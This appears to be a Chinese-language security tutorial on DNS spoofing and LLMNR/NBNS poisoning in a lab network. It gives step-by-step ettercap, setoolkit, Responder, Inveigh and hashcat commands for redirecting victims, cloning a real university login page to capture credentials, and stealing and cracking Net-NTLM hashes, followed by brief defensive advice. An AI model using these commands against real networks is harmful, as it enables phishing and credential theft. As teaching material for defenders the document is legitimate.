DNS(Domain Name
System)，即域名解析协议，域名系统以分布式数据库的形式将域名和IP地址相互映射，简单来说，DNS是用来解析域名的，有了DNS我们就不用再记住烦人的IP地址，用相对好记的域名就可以对服务器进行访问，即使服务器更换了IP地址，我们依旧可以通过域名访问该服务器，这样能够使我们更方便的访问互联网  
当我们在浏览器中输入www.baidu.com后，将经历以下查询过程：
  * 客户机向本地DNS服务器查询www.baidu.com
  * 本地DNS服务器检查本地数据库，由于没有baidu.com域的记录，因此它将查询信息传递到根域DNS服务器，请求解析主机名称
  * 根域DNS服务器把负责解析"com"域的DNS服务器的IP地址返回给本地DNS服务器
  * 本地DNS服务器将请求发送给负责"com"域的DNS服务器
  * 负责"com"域的服务器根据请求将负责"baidu.com"域的DNS服务器的IP地址返回给本地DNS服务器
  * 本地DNS服务器向负责"baidu.com"区域的DNS服务器发送请求，由于此服务器具有www.baidu.com的记录，因此它将www.baidu.com 的IP地址返回给本地DNS服务器
  * 本地DNS服务器将www.baidu.com的IP地址发送给客户机
  * 域名解析成功后，客户机将http请求发送给Web服务器
  * Web服务器响应客户机的访问请求，客户机便可以访问目标主机
#### DNS欺骗
DNS在互联网中扮演着如此重要的角色，但是在设计DNS协议时，设计者没有考虑到一些安全问题，导致了DNS的安全隐患与缺陷，DNS欺骗就是利用了DNS协议设计时的一个非常严重的安全缺陷  
首先，欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的真实的DNS应答包返回时则会被丢弃
#### 欺骗实践
##### 测试环境
  * 攻击主机：192.168.174.129
  * 目标主机：192.168.174.170
##### 简易测试
Step 1：测试攻击主机的网络连通性  
Step 2：之后在攻击者主机端启动Apache服务并构造一个钓鱼页面，这里简化为一个普通的HTML页面，本地测试效果如下  
Step 3：查找etter.dns文件，并修改该配置文件，将www.al1ex.com指向本机IP地址
    locate etter.dns
    leafpad /etc/ettercap/etter.dns
Step 4：使用ettercap开始欺骗
    ettercap -G
之后开启DNS欺骗  
Step 5：查看效果  
www.baidu.com——正常访问  
www.al1ex.com——钓鱼页面  
DNS欺骗记录：  
##### 钓鱼模拟
Step 1：开启端口转发功能
    echo 1 > /proc/sys/net/ipv4/ip_forward
Step 2：查找etter.conf文件，并修改该配置文件
    locate etter.conf
    leafpad /etc/ettercap/etter.conf
修改为0  
Step 3：查找etter.dns文件，并修改该配置文件
    locate etter.dns
    leafpad /etc/ettercap/etter.dns
增加一条DNS记录，这里的域名由我们制作的钓鱼网站域名而定：  
Step 4：下面进行DNS欺骗攻击
    ettercap -T -q -M arp:remote -P dns_spoof /192.168.174.170/192.168.174.2/
    #说明：
    受害者地址：192.168.174.170
    网关的地址：192.168.174.2
Step 5：使用setoolkit克隆网站
    setoolkit
    http://jwbinfosys.zju.edu.cn/default2.aspx
Step 6：在本地访问克隆网站  
Step 7：之后诱导用户访问网站  
效果有点差强人意，不过当用户访问网站并登录时，会获取到用户的登录凭证信息(后期发现是IE的安全策略的原因)  
DNS欺骗记录：  
#### 防御措施
DNS欺骗是很难进行有效防御的，因为大多情况下都是被攻击之后才会发现，对于避免DNS欺骗所造成危害，这里给出以下建议：  
1、因为DNS欺骗前提也需要ARP欺骗成功，所以首先做好对ARP欺骗攻击的防范  
2、不要依赖于DNS，尽管这样会很不方便，可以使用hosts文件来实现相同的功能  
3、使用安全检测软件定期检查系统是否遭受攻击  
4.使用DNSSEC
### LLMNR攻击
#### 协议简介
自Windows
Vista起，Windows操作系统开始支持一种新的名称解析协议—LLMNR，主要用于局域网中的名称解析，LLMNR能够很好的支持IPv4和IPv6，它也是一个仅次于DNS的名称解析方式，而且在Linux操作系统中也实现了LLMNR，LLMNR协议解析名称的特点为端到端，IPv4的广播地址为224.0.0.252，IPv6的广播地址为FF02:0:0:0:0:0:1:3或FF02::1:3
#### 解析顺序
  * 检查本地NetBIOS缓存，如果缓存中没有记录，则向当前子网/域发送广播进行查询
  * 检查当前子网/域内主机，如果没有主机响应，则整个请求宣告以失败结束
#### 协议风险
根据LLMNR协议的解析过程可知，当用户访问一个不存在的网络的域名时，例如:Al1ex.com，那么首先会去检查本地NetBIOS缓存，由于缓存记录中没有，进而转去向当前子网/域内进行广播查询，此时如果攻击者进行恶意应答，例如：欺骗用户Al1ex.com为攻击者的服务器端IP地址，那么用户便会先攻击者提供的恶意IP地址发起请求，同时使用用户的Net-NTLM进行身份验证，此时攻击者通过LLMNR投毒的方式即可成功捕获到用户的身份信息，示意图如下：  
#### 协议攻击
攻击者可以通过LLMNR协议进行投毒攻击，当用户访问某一个无法解析的域名(不存在/拼写错误)时可以使用LLMNR协议投毒的方式将攻击者主机的IP地址作为应答，之后窃取用户的Net-NTLM Hash
##### 演示环境
  * 域控主机：192.168.174.2
  * 域内主机：192.168.174.4
  * 攻击主机：192.168.174.129
##### 攻击手法
下面我们通过两种方式来演示如何进行LLMNR/NBNS欺骗攻击~
###### Responder
Step 1：在攻击主机上执行一下命令开启Responder
    ./Responder.py -I eth0
Step 2：之后模拟受害者访问不存在的\Al1ex.com(可以通过钓鱼的方式或者恶意PDF等众多的方式来实现)  
Step 3：之后在Responder端可以成功捕获到用户的NTLM-Hash  
Step 4：之后对用户的NTLM-Hash进行爆破(NTLM V1为5500，NTLM v2为5600)
    hashcat -m 5600 HTTP-NTLMv2-192.168.174.111.txt passkey.txt
###### Inveigh实现
Inveigh下载地址：  
Step 1：之用管理员权限打开攻击机器的powershell依次输入以下命令
    . .\Inveigh.ps1
    Invoke-Inveigh -ConsoleOutput Y
    #PS:如果有执行策略限制再加一条Set-ExecutionPolicy Bypass -Scope Process
Step 2：模拟受害者用户访问不存在的UNC路径，且无需认证  
Step 3：之后再攻击主机中可以看到已经成功抓取到Net-NTLM Hash  
###### Inveigh-Zero
项目地址：  
Step 1：之用管理员权限打开攻击机器的cmd之后执行以下命令
    Inveigh.exe
Step 2：模拟用户在浏览器中输入错误的UNC查询路径，且无需填写表单信息  
Step :3：之后可以捕获到用户的Net-NTLM Hash  
#### 防御措施
关于LLMNR Poison攻击的实战思路有很多，包括劫持FTP，MySQL，MSSQL Server等，具体的实现可自由发挥，同时为了防止遭到LLMNR
Poison攻击，可以导入下面的注册表键值关闭LLMNR，不过关闭了LLMNR以后， 可能用户的一些正常需求会受到影响~
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
    reg add "HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f